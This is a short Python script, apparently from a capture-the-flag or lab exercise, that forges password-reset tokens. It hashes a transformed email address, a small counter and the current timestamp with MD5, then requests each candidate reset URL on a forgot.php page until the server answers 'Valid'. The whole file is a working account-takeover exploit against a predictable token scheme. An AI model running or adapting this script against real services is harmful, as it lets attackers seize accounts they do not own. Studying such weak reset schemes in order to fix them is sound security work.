from hashlib import md5
from urllib import parse
from requests import get
import time

email = "61qwfZ@secure-chat.co.uk".upper()[::-1]
timestamp = str(int(time.time()))  # You can adjust the time here if needed

baseurl = "http://1/forgot.php?resetID="
urls = []

for i in range(0, 99):  # Loop through the possible random number (0 to 99)
    key = email + str(i) + timestamp
    hash = md5(key.encode('utf-8')).hexdigest()
    encodedhash = parse.quote(hash)
    urls.append(baseurl + encodedhash)

for url in urls:
    r = get(url)
    if "Valid" in r.text:  # Modify this based on the response from the server
        print(f"Valid URL: {url}")
        print(r.text)
        break
